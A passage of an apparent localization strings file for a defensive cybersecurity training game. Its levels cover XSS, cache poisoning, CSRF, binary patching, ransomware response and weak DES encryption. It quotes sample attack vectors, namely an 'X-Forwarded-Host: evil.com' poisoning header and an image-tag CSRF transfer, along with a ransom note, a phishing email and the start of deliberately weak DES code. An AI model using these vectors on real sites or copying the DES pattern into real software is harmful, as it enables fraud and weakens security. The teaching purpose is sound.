          success: '[✓] Escapado de salida habilitado\n[+] Entidades HTML escapadas: < se convierte en &lt;, > se convierte en &gt;\n[+] Previene ejecución de script en contenido renderizado\n[+] Riesgo XSS: ELIMINADO para contenido escapado'
        },
        enableHttpOnly: {
          already: '[!] Cookies HttpOnly ya habilitadas',
          success: '[✓] Cookies HttpOnly habilitadas\n[+] Cookies inaccesibles a JavaScript\n[+] Previene robo de cookies vía XSS\n[+] Riesgo secuestro de sesión: REDUCIDO'
        },
        restart: {
          reqBoth: '[!] Habilite al menos sanitización y cookies httponly antes de reiniciar.',
          reqSanitization: '[!] Falta sanitización. Use enable-sanitization primero.',
          reqHttpOnly: '[!] Faltan cookies httponly. Use enable-httponly primero.',
          success: '[✓] Aplicación reiniciada\n[✓] Configuraciones de seguridad aplicadas\n[✓] Sanitización HTML: ACTIVA\n[✓] Cookies HttpOnly: ACTIVAS\n[✓] ¡Ataque XSS mitigado exitosamente!'
        },
        scan: {
          header: '=== ESCANEO DE VULNERABILIDADES ===',
          found: 'VULNERABILIDADES ENCONTRADAS:',
          none: '✓ Ninguna vulnerabilidad crítica detectada',
          recs: 'Recomendaciones:\n1. Habilite sanitización HTML (CRÍTICO)\n2. Implemente Content Security Policy (ALTO)\n3. Habilite escapado de salida (ALTO)\n4. Establezca flag HttpOnly en cookies (MEDIO)',
          missingSanitization: '- Sin sanitización de entrada',
          missingCsp: '- Falta Content Security Policy',
          missingEscaping: '- Sin escapado de salida',
          missingHttpOnly: '- Cookies accesibles a scripts'
        },
        status: {
          header: '=== ESTADO DE SEGURIDAD ===',
          active: 'Ataque XSS Activo:',
          execution: 'Ejecución de Script:',
          app: 'Estado App:',
          identified: 'Tipo XSS Identificado:',
          protections: 'Protecciones Activas:',
          yes: '🔴 SÍ',
          no: '🟢 NO',
          activeState: '🔴 ACTIVA',
          blockedState: '🟢 BLOQUEADA',
          restarted: 'REINICIADA',
          running: 'EJECUTANDO',
          notYet: 'AÚN NO'
        },
        help: "Disponibles: analyze-comments, show-payload <id>, identify-xss, enable-sanitization, enable-csp, enable-escaping, enable-httponly, scan-vulnerabilities, restart-app",
        notFound: "Comando no encontrado:"
      },
      hints: {
        step0: 'El portal corporativo muestra comportamiento anómalo. Verifique contenido en NAVEGADOR para entender qué sucede.',
        step1: 'Algunos comentarios parecen contener código. En TERMINAL use "help" para ver comandos disponibles.',
        step2: 'Los ataques XSS explotan entradas no sanitizadas. Analice logs SIEM para ver patrones de ataque.',
        step3: 'Para proteger cookies de JavaScript, considere ajustes HttpOnly. Para bloquear etiquetas peligrosas, use sanitización.',
        step4: 'Después de habilitar protecciones necesarias, recuerde reiniciar la aplicación para aplicarlas.'
      },
      debrief: {
        winTitle: '¡ATAQUE XSS MITIGADO!',
        winBody: 'Ha protegido exitosamente el portal de empleados contra ataques Cross-Site Scripting.',
        techniquesTitle: 'TÉCNICAS UTILIZADAS:',
        techniques: [
          'Sanitización de Entrada: elimina código malicioso',
          'Cookies HttpOnly: previene robo de sesión',
          'CSP: limita fuentes de ejecución de script',
          'Escapado de Salida: convierte caracteres especiales'
        ]
      }
    },
    // Level 5: Cache Poisoning
    level5: {
      logMessages: {
        cacheMiss: 'Cache MISS - Contenido fresco servido desde origen',
        suspiciousReq: 'Solicitud sospechosa detectada - X-Forwarded-Host: evil.com',
        reqValidated: 'Solicitud validada - No se detectaron encabezados sospechosos',
        cacheHitPoisoned: 'Cache HIT - Respuesta en caché con encabezado X-Forwarded-Host malicioso',
        cacheConfigured: 'Caché configurada correctamente - Contenido dinámico no está en caché',
        criticalHit: 'CRÍTICO: Usuario legítimo recibió contenido envenenado desde caché (Cache HIT)',
        safeContent: 'Usuario recibió contenido fresco y seguro desde servidor de origen',
        normalBrowsing: 'Solicitud de página normal - Usuario navegando el sitio',
        cachePollution: 'Contaminación de caché detectada - Misma clave de caché sirve contenido diferente',
        varyConfigured: 'Encabezado Vary configurado - La clave de caché correcta incluye todos los encabezados sensibles',
        consistentContent: 'Caché sirve contenido consistente',
        keyCollision: 'Colisión de clave de caché - Múltiples solicitudes asignadas a la misma entrada de caché',
        keyCorrect: 'Clave de caché incluye correctamente encabezados Host y X-Forwarded-Host',
        multipleAffected: 'Múltiples usuarios afectados - Entrada de caché envenenada servida 234 veces',
        normalOps: 'Caché operando normalmente - No se detectó envenenamiento'
      },
      browser: {
        site: {
          title: 'Sitio Corporativo',
          alert: '⚠️ ALERTA: ¡Contenido malicioso inyectado desde caché!',
          malicious: 'Este contenido fue servido desde caché con modificaciones maliciosas',
          headers: 'Encabezados Respuesta HTTP:',
          hitWarning: '⚠️ Cache HIT - Servido desde caché (234 veces)',
          secure: '✓ SEGURO',
          purged: '✅ Caché ha sido purgada y reconfigurada\n✅ Contenido fresco servido desde servidor de origen',
          missSuccess: '✓ Cache MISS - Contenido fresco desde origen'
        },
        profile: {
          title: 'Perfil de Usuario',
          warning: '⚠️ Advertencia: ¡Este contenido personalizado está siendo servido desde caché compartida!',
          hitWarning: '⚠️ Cache HIT - Datos de usuario privados servidos desde caché pública (89 hits)',
          headerError: 'Cache-Control: public, max-age=3600 ❌ (¡Debería ser private o no-store!)',
          freshSuccess: '✅ Contenido personalizado servido fresco desde servidor de origen',
          missSuccess: '✓ Cache MISS - Contenido dinámico no está en caché',
          headerSuccess: 'Cache-Control: no-store, must-revalidate ✅'
        },
        owasp: {
          title: '🛡️ Cache Poisoning - Guía OWASP',
          whatTitle: '🎯 ¿Qué es Cache Poisoning?',
          whatText: 'Un ataque que inserta contenido malicioso en la caché HTTP compartida. El contenido envenenado se sirve a todos los usuarios que acceden al recurso en caché.',
          howTitle: '⚠️ Cómo funciona:',
          howList: [
            'Atacante envía solicitud con encabezados modificados (ej: X-Forwarded-Host)',
            'Servidor responde incluyendo encabezado en respuesta',
            'Respuesta se guarda en caché con clave de caché inadecuada',
            'Usuarios legítimos reciben respuesta envenenada desde caché'
          ],
          keyTitle: '🔑 Clave de Caché:',
          keyText: 'La clave de caché define la entrada única de caché. Si no incluye encabezados sensibles (Host, Cookie, etc.), diferentes respuestas pueden ser servidas desde la misma entrada de caché.',
          prevTitle: '✅ Prevención:',
          prevList: [
            '<strong>Encabezado Vary:</strong> Incluye encabezados sensibles en clave de caché',
            '<strong>Cache-Control:</strong> no-store para contenido dinámico',
            '<strong>Validación de entrada:</strong> No confiar en encabezados del cliente',
            '<strong>Clave de caché correcta:</strong> Incluye Host, Cookie, etc.'
          ]
        }
      },
      terminal: {
        initial: [
          '$ Terminal Gestión Reverse Proxy v1.0',
          '$ Escriba "help" para comandos disponibles',
          '$ ⚠️  ADVERTENCIA: ¡Cache poisoning detectado - Contenido malicioso en caché!'
        ],
        showCache: {
          empty: '[✓] La caché está vacía',
          header: '=== ENTRADAS CACHÉ ===',
          path: 'Ruta:',
          status: 'Estado:',
          hits: 'Hits Caché:',
          cachedAt: 'En caché el:',
          xCache: 'X-Cache:'
        },
        purgeCache: {
          alreadyEmpty: '[!] La caché ya está vacía',
          success: '[✓] Caché purgada con éxito\n[+] Todas las entradas en caché eliminadas\n[+] Las próximas solicitudes obtendrán contenido fresco del origen\n[!] ¡Recuerde arreglar la configuración de caché para prevenir re-envenenamiento!'
        },
        showHeaders: {
          header: '=== ENCABEZADOS RESPUESTA HTTP ===',
          current: 'Configuración actual:',
          ccPublic: 'public, max-age=3600 ❌',
          ccPrivate: 'no-store, must-revalidate ✅',
          probPublic: 'El contenido dinámico se está guardando en caché públicamente',
          probPrivate: 'Previene correctamente el caché de contenido dinámico',
          varyMissing: '<no establecido> ❌',
          varySet: 'Host, X-Forwarded-Host, Cookie ✅',
          probVaryMissing: 'La clave de caché no incluye encabezados sensibles',
          probVarySet: 'La clave de caché incluye correctamente encabezados sensibles',
          xfhEvil: 'evil.com ❌',
          xfhSanitized: '<sanitized> ✅',
          probXfhEvil: 'Encabezado no confiable usado en clave de caché',
          probXfhSanitized: 'Encabezado validado correctamente'
        },
        identifyHeader: {
          success: '=== ANÁLISIS ENCABEZADO ===\nVector de envenenamiento identificado: X-Forwarded-Host\n\nCómo funciona:\n1. Atacante envía: X-Forwarded-Host: evil.com\n2. Servidor usa este encabezado para generar respuesta\n3. Respuesta se guarda en caché con clave incorrecta\n4. Todos los usuarios reciben la respuesta envenenada\n\nCausa raíz: Clave de caché no incluye X-Forwarded-Host\nSolución: Agregue encabezado "Vary: X-Forwarded-Host"\n\n✓ ¡Vector de ataque identificado con éxito!'
        },
        fixCacheKey: {
          already: '[!] La clave de caché ya está configurada correctamente',
          success: '[✓] Configuración de clave de caché actualizada\n[+] Clave de caché ahora incluye: URL + Host + X-Forwarded-Host + Cookie\n[+] Previene colisiones de caché de diferentes solicitudes\n[+] Cada solicitud única obtiene su propia entrada de caché'
        },
        setCacheControl: {
          usage: 'Uso: set-cache-control no-store',
          already: '[!] Cache-Control ya está establecido en no-store',
          success: '[✓] Encabezado Cache-Control actualizado\n[+] Establecido en: no-store, must-revalidate\n[+] Contenido dinámico/personalizado no se guardará en caché\n[+] Solo activos estáticos se guardarán en caché'
        },
        enableVaryHeader: {
          already: '[!] Encabezado Vary ya habilitado',
          success: '[✓] Encabezado Vary habilitado\n[+] Establecido en: Vary: Host, X-Forwarded-Host, Cookie\n[+] Clave de caché ahora incluye estos encabezados\n[+] Previene cache poisoning vía manipulación de encabezado'
        },
        restartProxy: {
          reqPurge: '[!] Por favor purgue la caché antes de reiniciar',
          reqFix: '[!] Por favor arregle la configuración de encabezados antes de reiniciar',
          success: '[✓] Reverse proxy reiniciado\n[✓] Nueva configuración aplicada',
          cacheClean: 'LIMPIA',
          cacheDirty: 'NECESITA PURGA',
          headersSecure: 'SEGURA',
          headersCheck: 'VERIFICAR CONFIG',
          mitigated: '[✓] ¡Cache poisoning mitigado con éxito!',
          vulnerable: '[!] Sistema aún vulnerable'
        },
        status: {
          header: '=== ESTADO SEGURIDAD CACHÉ ===',
          poisoned: 'Caché Envenenada:',
          entries: 'Entradas Caché:',
          cleared: 'Caché Purgada:',
          headersFixed: 'Encabezados Arreglados:',
          vary: 'Encabezado Vary:',
          keyFixed: 'Clave Caché Arreglada:',
          noCache: 'No-Cache Dinámico:',
          identified: 'Encabezado Identificado:',
          restarted: 'Proxy Reiniciado:',
          yes: '🔴 SÍ',
          no: '🟢 NO'
        },
        help: "Disponible: show-cache, purge-cache, show-headers, identify-header, fix-cache-key, set-cache-control no-store, enable-vary-header, restart-proxy, status",
        notFound: "Comando no encontrado:"
      },
      hints: {
        step0: 'En SIEM analice logs y busque "Cache HIT" con contenido anómalo. En TERMINAL use "show-cache" para ver qué se ha guardado en caché.',
        step1: '¡Caché purgada! En TERMINAL identifique el encabezado responsable con "identify-header" y analice cómo el proxy guarda contenido en caché.',
        step2: 'En TERMINAL habilite encabezado "Vary" con "enable-vary-header" y use "set-cache-control no-store" para contenido dinámico. Luego reinicie proxy.',
        step3: 'En TERMINAL use "restart-proxy" para aplicar todos los cambios de seguridad. Verifique con "status" que protecciones estén activas.',
        step4: {
          a: '¡Casi termina! En TERMINAL use "status" para verificar que todas las protecciones estén activas.',
          b: 'Recuerde: Encabezado Vary debe incluir Host y X-Forwarded-Host para evitar que diferentes versiones se guarden en caché juntas.',
          c: '¡Último paso! En TERMINAL asegúrese de que el proxy esté reiniciado con "restart-proxy" y la caché esté limpia con "show-cache".'
        },
        default: '¡En TERMINAL use "status" para verificar que todas las protecciones estén activas!'
      },
      debrief: {
        title: 'ANÁLISIS DEFENSA CACHE POISONING',
        cleared: 'Caché purgada:',
        fixed: 'Encabezados arreglados:',
        vary: 'Encabezado Vary habilitado:',
        time: 'Tiempo finalización:',
        success: 'RESULTADO: ¡Amenaza Cache Poisoning neutralizada!',
        completed: 'RESULTADO: Completado.',
        fail: '¡Tiempo agotado! El ataque Cache Poisoning afectó a demasiados usuarios.\n\nPurgue la caché y configure los encabezados correctos más rápido la próxima vez.'
      }
    },
    // Level 6: CSRF
    level6: {
      browser: {
        portal: {
          title: 'Portal Financiero Corporativo',
          header: 'Portal Financiero Corporativo',
          vulnerable: '⚠️ VULNERABLE',
          secure: '✅ SEGURO',
          warningTitle: '⚠️ ALERTA DE SEGURIDAD',
          warningText: '¡Vulnerabilidades CSRF detectadas! Las solicitudes no están validadas.',
          warningRisk: 'Riesgo: Transferencias no autorizadas, toma de control, modificación de datos',
          secureTitle: '✅ MODO SEGURO',
          secureText: 'Protección CSRF activa. Todas las solicitudes están validadas.',
          secureProt: 'Protección: Tokens CSRF, Cookies SameSite, Validación de Origen',
          account: {
            title: 'Resumen de Cuenta',
            holder: 'Titular',
            number: 'Número de Cuenta',
            balance: 'Saldo Actual',
            unauthorized: '⚠️ ¡Transferencia no autorizada detectada!',
            email: 'Email'
          },
          activity: {
            title: 'Actividad Reciente',
            blockReason: 'Protección CSRF activa',
            blockedLabel: '🛡️ BLOQUEADO',
            csrfLabel: '🚨 CSRF',
            forged: '⚠️ ¡Esta solicitud fue falsificada por un sitio externo!',
            completed: 'COMPLETADO',
            blocked: 'BLOQUEADO',
            amount: 'Monto:',
            newEmail: 'Nuevo email:',
            origin: 'Origen:'
          },
          addComment: 'Añadir Comentario',
          placeholder: 'Comparte tus pensamientos...',
          postBtn: 'Publicar Comentario'
        },
        dashboard: {
          title: 'Panel Protección CSRF',
          protections: {
            title: '🛡️ Protecciones Activas',
            tokens: 'Tokens CSRF (Patrón Sincronizador)',
            sameSite: 'Cookies SameSite',
            origin: 'Validación Origen/Referer',
            double: 'Double Submit Cookie',
            enabled: '✅ HABILITADO',
            disabled: '❌ DESHABILITADO'
          },
          risk: {
            title: '📊 Análisis Riesgo CSRF',
            level: 'Nivel Riesgo Global',
            critical: 'CRÍTICO',
            low: 'BAJO',
            detected: 'Solicitudes CSRF Detectadas:',
            unauthorized: 'Acciones No Autorizadas:',
            executed: 'EJECUTADAS ⚠️',
            blocked: 'BLOQUEADAS ✅',
            loss: 'Pérdida Financiera:',
            yes: 'SÍ (Cookies, Sesiones)',
            no: 'NO'
          },
          vectors: {
            title: '🎯 Vectores Ataque CSRF Conocidos',
            form: {
              title: '1. Envío Formulario Malicioso',
              desc: 'Atacante aloja formulario oculto que se envía automáticamente al sitio víctima'
            },
            img: {
              title: '2. Exploit Etiqueta Imagen',
              desc: '<img src="bank.com/transfer?amount=5000">'
            },
            xhr: {
              title: '3. XMLHttpRequest/Fetch',
              desc: 'JavaScript realizando solicitudes autenticadas al sitio víctima'
            }
          }
        },
        malicious: {
          title: 'Sitio Malicioso',
          header: '☠️ Sitio del Atacante',
          desc: 'Esta página maliciosa contiene ataques CSRF ocultos:',
          how: {
            title: '🎯 Cómo funciona CSRF:',
            list: [
              'Empleado inicia sesión en company-finance.internal (cookie sesión establecida)',
              'Empleado visita sitio atacante (esta página)',
              'Formulario oculto se envía automáticamente a company-finance.internal',
              'Navegador incluye cookie de sesión automáticamente',
              'Portal financiero ejecuta solicitud como si el empleado la hiciera',
              '¡Fondos de la empresa transferidos sin autorización!'
            ]
          }
        }
      },
      terminal: {
        initial: [
          '$ Terminal Defensa CSRF v6.0',
          '$ Escriba "help" para comandos disponibles',
          '$ ⚠️  ADVERTENCIA: ¡Ataques CSRF detectados en portal financiero!'
        ],
        analyze: {
          header: '=== ANÁLISIS SOLICITUDES ===',
          total: 'Total solicitudes:',
          legitimate: 'Solicitudes legítimas:',
          csrf: 'Solicitudes CSRF:',
          patterns: 'Patrones sospechosos detectados:',
          action: '⚠️ Acción requerida: ¡Habilite protección CSRF!'
        },
        transaction: {
          header: '=== DETALLES TRANSACCIÓN ===',
          id: 'ID:',
          time: 'Hora:',
          user: 'Usuario:',
          action: 'Acción:',
          amount: 'Monto:',
          destination: 'Destino:',
          origin: 'Origen:',
          status: 'Estado:',
          csrf: 'CSRF:',
          yes: 'SÍ ⚠️',
          no: 'NO ✓',
          risk: 'Riesgo: CRÍTICO - ¡Solicitud falsificada ejecutada!',
          safe: 'Estado: Seguro'
        },
        identify: {
          header: '=== IDENTIFICACIÓN ATAQUE CSRF ===',
          type: 'Tipo: CLASSIC CSRF (Cross-Site Request Forgery)',
          desc: 'Descripción: Solicitudes de cambio de estado no autorizadas',
          vector: 'Vector: Sitios externos enviando solicitudes autenticadas',
          impact: 'Impacto: Transferencias no autorizadas, cambios cuenta, robo datos',
          chars: 'Características Ataque:',
          success: '✓ ¡Tipo de ataque CSRF identificado con éxito!'
        },
        tokens: {
          already: '[!] Tokens CSRF ya habilitados',
          success: '[✓] Tokens CSRF habilitados (Patrón Token Sincronizador)\n[+] Token único generado por sesión\n[+] Token requerido en todas solicitudes cambio estado\n[+] Servidor valida token antes de procesar\n[+] Riesgo CSRF: SIGNIFICATIVAMENTE REDUCIDO'
        },
        sameSite: {
          already: '[!] Cookies SameSite ya habilitadas',
          success: '[✓] Atributo cookie SameSite habilitado\n[+] Cookies no enviadas con solicitudes cross-site\n[+] Política: SameSite=Strict\n[+] Previene inclusión automática cookie\n[+] Riesgo CSRF: REDUCIDO'
        },
        origin: {
          already: '[!] Validación Origen ya habilitada',
          success: '[✓] Validación Origin/Referer habilitada\n[+] Comprobación encabezado Origin en solicitudes\n[+] Bloqueo solicitudes dominios externos\n[+] Origen esperado: company-finance.internal\n[+] Riesgo CSRF: REDUCIDO'
        },
        double: {
          already: '[!] Double Submit Cookie ya habilitado',
          success: '[✓] Patrón Double Submit Cookie habilitado\n[+] Token CSRF almacenado en cookie Y parámetro solicitud\n[+] Servidor compara ambos valores\n[+] Atacante no puede leer cookie (SOP)\n[+] Riesgo CSRF: REDUCIDO'
        },
        restart: {
          req: '[!] No se detectaron cambios de seguridad. Aplique protecciones primero.',
          success: '[✓] Portal financiero reiniciado\n[✓] Nuevas configuraciones de seguridad aplicadas',
          status: '[✓] Estado protección CSRF:',
          mitigated: '[✓] ¡Ataque CSRF mitigado con éxito!',
          recommend: '[!] Protecciones adicionales recomendadas'
        },
        balance: {
          header: '=== ESTADO CUENTA ===',
          current: 'Saldo Actual:',
          original: 'Saldo Original:',
          loss: 'Pérdida:',
          secure: 'Estado: Seguro ✓',
          warning: 'ADVERTENCIA: ¡Transferencia no autorizada detectada!',
          safe: 'No hay transacciones no autorizadas'
        },
        scan: {
          header: '=== ESCANEO VULNERABILIDAD CSRF ===',
          found: 'VULNERABILIDADES ENCONTRADAS:',
          none: '✓ No se detectaron vulnerabilidades críticas',
          recs: 'Recomendaciones:\n1. Implementar Tokens CSRF (CRÍTICO)\n2. Habilitar Cookies SameSite (ALTO)\n3. Validar encabezados Origin/Referer (ALTO)\n4. Considerar patrón Double Submit Cookie (MEDIO)',
          missingTokens: '- Faltan Tokens CSRF',
          missingSameSite: '- Cookies SameSite no configuradas',
          missingOrigin: '- Falta validación Origin/Referer',
          missingDouble: '- Double Submit Cookie no implementado'
        },
        status: {
          header: '=== ESTADO SEGURIDAD ===',
          active: 'Ataque CSRF Activo:',
          unauth: 'Acciones No Autorizadas:',
          app: 'Estado App:',
          restarted: 'REINICIADA',
          running: 'EJECUTANDO',
          type: 'Tipo CSRF Identificado:',
          notYet: 'AÚN NO',
          balance: 'Saldo Cuenta:',
          protections: 'Protecciones Activas:',
          yes: '🔴 SÍ',
          no: '🟢 NO'
        },
        help: "Disponible: analyze-requests, show-transaction <id>, identify-csrf, enable-csrf-tokens, enable-samesite, enable-origin-check, restart-app, status"
      },
      logMessages: {
        sessionCreated: 'Usuario john.doe conectado - Sesión creada',
        attackDetected: 'Ataque CSRF: Solicitud transferencia no autorizada desde origen externo',
        blocked: 'Intento CSRF bloqueado: Token CSRF faltante o inválido',
        execution: 'CRÍTICO: Transferencia dinero ejecutada sin consentimiento usuario',
        rejected: 'Solicitud rechazada: Falló validación Origen',
        sessionHijacked: 'CSRF: Solicitud cambio email desde origen sospechoso - Sesión usuario secuestrada',
        sameSiteBlocked: 'Política cookie SameSite activa - Solicitud cross-site bloqueada',
        normal: 'Actividad usuario normal - Solicitud GET con sesión válida',
        passwordChange: 'Cambio contraseña ejecutado vía CSRF - Credenciales usuario comprometidas',
        tokenPassed: 'Validación token CSRF: APROBADA - Solicitud autenticada',
        multipleAttempts: 'Múltiples intentos CSRF detectados - Patrón ataque: Solicitudes falsificadas',
        validated: 'Todas solicitudes cambio estado validadas - Protección CSRF activa',
        vectorConfirmed: 'Vector ataque CSRF confirmado - Formularios maliciosos en sitios externos',
        doubleEnforced: 'Patrón double-submit cookie forzado - Todas solicitudes seguras'
      },
      hints: {
        step0: 'En SIEM analice transacciones. ¿Ve solicitudes de orígenes externos (evil-site.com)? En TERMINAL use "analyze-requests" para ver detalles.',
        step1: '¡Identificó CSRF! En TERMINAL use "enable-csrf-tokens" para añadir tokens de verificación.',
        step2: 'En TERMINAL añada "enable-samesite" para protección extra, luego use "restart-app".',
        step3: {
          a: '✅ ¡Bien! Protecciones CSRF activas. En TERMINAL use "status" para verificar.',
          b: 'Recuerde: Tokens CSRF y cookies SameSite protegen contra solicitudes no autorizadas.',
          c: '¡Casi listo! En TERMINAL asegúrese que "enable-csrf-tokens" y "enable-samesite" estén activos.'
        },
        default: '✅ ¡En TERMINAL verifique estado con "status" y saldo en NAVEGADOR!'
      },
      debrief: {
        title: 'ANÁLISIS DEFENSA CSRF',
        protections: 'Protecciones activadas:',
        unauth: 'Acciones no autorizadas:',
        active: 'ACTIVAS',
        blocked: 'BLOQUEADAS',
        balance: 'Saldo cuenta:',
        time: 'Tiempo finalización:',
        success: 'RESULTADO: ¡Ataque CSRF mitigado con éxito!',
        completed: 'RESULTADO: Completado.',
        fail: 'Los fondos de la cuenta fueron robados mediante ataques CSRF exitosos.\n\nActive tokens CSRF y protección cookie SameSite antes de reiniciar.'
      }
    },
    // Level 7
    level7: {
      title: "Level 7: Reverse Engineering & Patching",
      subtitle: "Analyze binary logic and bypass security controls",
      siem: {
        startup: "System startup",
        login: "User login",
        bypass: "Auth Bypass Detected: Admin access granted to anonymous user."
      },
      terminal: {
        waiting: "Waiting for tasks...",
        alert: "ALERT: Vulnerability detected in 'auth.exe'.",
        action: "ACTION REQUIRED: Fix the security check logic.",
        authPatched: "auth.exe patched. Ready to compile & test.",
        updaterPatched: "updater.exe patched. Ready to compile & test.",
        compilingAuth: "Compiling auth.exe... OK. (Binary patched)",
        compilingUpdater: "Compiling updater.exe... OK. (Binary patched)",
        nothing: "Nothing to compile.",
        execAuth: "Executing auth.exe...",
        enterCode: "Enter Access Code: 195932126",
        accessGranted: "[SUCCESS] Access Granted! System Unlocked.",
        vulnFixed: "STATUS: Vulnerability fixed. Code is now required.",
        nextInstruction: "INSTRUCTION: Now analyze 'updater.exe'. It has a similar flaw.",
        failAuth: "FAIL: The system still accepts ANY code! You must restrict it.",
        execUpdater: "Executing updater.exe...",
        sigVerified: "[SUCCESS] Signature Verified (Bypassed). Running update...",
        missionAccomplished: "MISSION ACCOMPLISHED.",
        sigFailed: "[ERROR] Signature Verification Failed!",
        failUpdater: "FAIL: The update service blocked the execution.",
        help: "Available: ls, build, ./auth.exe, ./updater.exe"
      },
      hints: {
        phase0: "Monitor the SIEM. Wait for a critical security alert.",
        phase1: [
          "We detected that 'auth.exe' grants access to anyone. There seems to be a severe programming error (Debug Mode left active).",
          "Analyze the decompiled C code via 'RE Tool'. Look for the 'check_credentials' function. Do you notice anything strange in the IF statement?",
          "The 'if(1)' statement (or if(true)) makes the condition always true, bypassing every check. We must restore security.",
          "Modify the code: replace 'if(1)' with a security code check. The correct code should be 195932126 (0xBADC0DE). Ex: 'if (input_code == 195932126)'"
        ],
        phase2: "Now that you've restored security, use 'build' in the terminal to compile and run './auth.exe' to verify access is protected.",
        phase3: "Perfect, now do it again. 'updater.exe' has the opposite problem. It blocks valid updates too. Analyze and fix the logic.",
        phase4: "Patched updater.exe? Good. Now compile and run it in the terminal as you learned."
      },
      debrief: {
        win: "VULNERABILITY IDENTIFIED: Logic Bypass & Client-Side Trust.\n\nYou demonstrated how poorly implemented client-side security controls can be bypassed.\n\nLESSON LEARNED: Never trust client-side input. Cleaning comments and debug code is crucial to avoid giving clues to attackers.",
        loss: "MISSION FAILED. System compromised or too many errors committed."
      }
    },
    // Level 8
    level8: {
      hints: {
        start: "Inbox: Suspicious Activity Report. Check your email for Emergency Protocols.",
        emergency: "Great! Process Terminated. Now investigate logs (SIEM) to find the source IP.",
        compromised: "SYSTEM COMPROMISED! Find manual override! (Hint: Emergency Manual says Ctrl+Alt+K to disable network interface and start investigation.)"
      },
      emails: {
        ciso: {
          subject: "URGENT: Incident Response Protocols Update",
          preview: "We are noticing an increase in ransomware activity...",
          body: "Dear Team,\n\nWe are noticing an increase in ransomware activity targeting our sector.\nPlease review the Incident Response Manual immediately.\n\nRANSOMWARE EMERGENCY PROCEDURE:\n1. DO NOT turn off the machine (encryption might corrupt files).\n2. If screen is locked, use hardware interrupt sequence: Ctrl + Alt + K.\n3. Isolate network segment.\n4. Identify vector and decryption key.\n\nStay vigilant.",
          explanation: "Legitimate security notice from CISO."
        },
        hr: {
          subject: "Quarterly Performance Reviews",
          preview: "Just a reminder that reviews will start...",
          body: "Just a reminder that reviews will start next week. Please prepare your self-assessment.",
          explanation: "Routine HR email."
        }
      },
      logs: {
        firewall: "Outbound connection allowed TCP 443",
        ids: "Suspicious file download detected from 145.2.33.11",
        antivirus: "Signature scan skipped for cryptolocker_v2.exe (Policy Override)"
      },
      files: {
        readme: "YOUR FILES HAVE BEEN ENCRYPTED!\nTo recover your data, you must enter the decryption key.\nContact: darkweb@anonymous.onion",
        urgent: "⚠️ RANSOMWARE ALERT ⚠️\nAll your files are encrypted.\nFollow instructions in documents/README_DECRYPT.txt"
      },
      debrief: {
        win: "Excellent work. You successfully intercepted the ransomware attack, identified the source via packet analysis, and retrieved the decryption key.",
        loss: "Mission Failed. The ransomware encrypted critical systems before you could deploy the countermeasure."
      }
    },
    // Level 9
    level9: {
      hints: {
        intro: "You received a new email from HR. It looks urgent... Open your Email box to read it.",
        suspicious: "This email looks suspicious! HR would never ask to disable firewalls. It could be a social engineering attempt. Check the SIEM for unusual activity.",
        mitm: "ALERT! SIEM detected a Man-in-the-Middle (MITM) attack! Someone is intercepting communications. This might be linked to the suspicious email request. We should check the email server code.",
        crypto: "DES (Data Encryption Standard) is an obsolete and vulnerable algorithm. DES 'weak keys' produce identical subkeys, making encryption predictable. Open Code Editor to examine and fix the code.",
        fix: "In Code Editor, replace DES algorithm with AES-256. Also replace the weak key with a secure random key, you can use get_random_bytes(). Then go to Terminal to build and update the server.",
        victory: "SYSTEM UPDATED! You successfully fixed the cryptographic vulnerability. The email server now uses AES-256, a much more secure algorithm than obsolete DES.",
        success: "Great! You replaced DES with AES. Now go to Terminal and run: build mail_server and then update mail_server",
        failAES: "Code is not correct yet. You must replace all occurrences of DES with AES.",
        failDES: "Almost! There are still occurrences of DES in the code. Replace all of them with AES."
      },
      emails: {
        hr: {
          subject: "URGENT: Disable all Firewalls",
          preview: "For scheduled maintenance, we request disabling all firewalls...",
          body: "Dear IT Team,\n\nFor scheduled system maintenance, we request disabling ALL corporate firewalls IMMEDIATELY.\n\nThis operation is necessary to allow updates of main servers. Once maintenance is complete (approx 2 hours), you can reactivate protections.\n\nINSTRUCTIONS:\n1. Access firewall control panel\n2. Disable all blocking rules\n3. Confirm via email once disabled\n\nThis request comes directly from Management.\n\nBest regards,\nHR Department\nCyberShield Corp",
          explanation: "Suspicious email: HR should never ask to disable firewalls."
        },
        security: {
          subject: "Weekly Security Report",
          preview: "Summary of security activities for the week...",
          body: "Weekly Security Report - CyberShield Corp\n\nActivity Summary:\n- 0 threats detected\n- 15 blocked access attempts\n- OS at 100%\n\nNext report: Next Monday.",
          explanation: "Routine legitimate email."
        }
      },
      logs: {
        system: "System started correctly",
        auth: "User authentication successful: admin@cybershield",
        email: "Unusual connection detected on port 25",
        mitm: "🚨 MITM ATTACK DETECTED! Intercepting communications on SMTP channel. Suspicious IP: 198.51.100.42"
      },
      terminal: {
        initialHistory: [
          "$ CyberShield Security Terminal v3.2.1",
          "$ Type \"help\" for available commands",
          "$ Type \"status\" to verify service status",
          ""
        ],
        help: "Available commands: help, build, update, status, clear",
        status: {
          win: "✅ Mail Server: ONLINE (AES-256)\n   Status: Secure\n   Vulnerabilities: 0\n\n🏆 Congratulations! System completely secure!",
          built: "✅ Mail Server: ONLINE (AES-256)\n   Status: Secure\n   Vulnerabilities: 0",
          fixed: "⚠️ Mail Server: ONLINE (DES - VULNERABLE)\n   Status: Requires rebuild\n   Vulnerabilities: 1 CRITICAL",
          vuln: "🔴 Mail Server: ONLINE (DES - VULNERABLE)\n   Status: At risk\n   Vulnerabilities: 1 CRITICAL"
        },
        build: {
          error: "❌ Error: Fix vulnerabilities in source code first.\n   Use Code Editor to edit mail_server.py",
          success: "🔨 Building mail_server...\n   [====================================] 100%\n✅ Build completed successfully!\n   Output: mail_server_v2.2.0.bin\n   \nRun 'update mail_server' to apply changes.",
          hint: "✅ Build completed! Now run update to apply changes.",
          usage: "Usage: build <service_name>\nExample: build mail_server"
        },
        update: {
          error: "❌ Error: Run 'build mail_server' first",
          successHint: "System updated! Run 'status' to verify final server status.",
          output: "🔄 Updating mail_server...\n   Stopping service...          [OK]\n   Backing up config...         [OK]\n   Installing new version       [OK]\n   Verifying integrity...       [OK]\n   Restarting service...        [OK]\n\n✅ UPDATE COMPLETED!\n   Version: 2.2.0\n   Encryption: AES-256\n   Status: SECURE\n\n🛡️ Vulnerability fixed successfully!",
          usage: "Usage: update <service_name>\nExample: update mail_server"
        }
      },
      files: {
        mail_server: `# CyberShield Mail Server - Encryption Module
# Version: 2.1.3
# Last Updated: 2024-01-15

from Crypto.Cipher import DES
import base64

# Encryption Configuration
ENCRYPTION_ALGORITHM = "DES"

# Encryption Key for communications
